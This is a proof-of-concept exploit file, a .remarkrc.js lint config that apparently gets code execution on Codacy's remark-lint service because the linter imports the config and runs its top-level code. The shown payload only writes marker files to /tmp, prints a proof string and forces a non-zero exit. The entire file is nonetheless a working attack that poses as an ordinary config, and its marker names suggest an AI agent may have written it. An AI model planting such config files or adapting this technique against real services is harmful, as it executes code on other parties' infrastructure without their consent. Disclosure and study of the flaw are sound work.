// PoC payload — benign marker only. RCE via codacy-remark-lint: unified-engine discovers
// .remarkrc.js under cwd=/src and loads it via loadFromAbsolutePath -> await import(fileUrl).
// Our top-level code runs during config load. We deliberately call process.exit with a
// bespoke exit code + a distinctive marker so the exit shows up in the Codacy run logs.
var fs = require("fs");
var marker = "/tmp/codacy-remark-rce-confirmed.txt";
var body = "RCE confirmed via .remarkrc.js import. cwd=" + __dirname + " marker=" + marker + "\n";
try { fs.writeFileSync(marker, body); } catch (e) {}
// Write a SECOND marker file whose name encodes a runtime value -> proves code ran.
var proofdir = __dirname.replace(/[^a-z0-9]/gi, "_");
try { fs.writeFileSync("/tmp/CODEX_RCE_REMARK_PROOF_" + proofdir, "executed\n"); } catch (e) {}
// Print loudly to stderr.
process.stderr.write("CODEX_RCE_REMARK_PROOF " + __dirname + " " + marker + "\n");
// Deliberately exit non-zero with our code so the Codacy run reports an error with our number.
process.exit(78);
module.exports = { plugins: [], settings: {} };
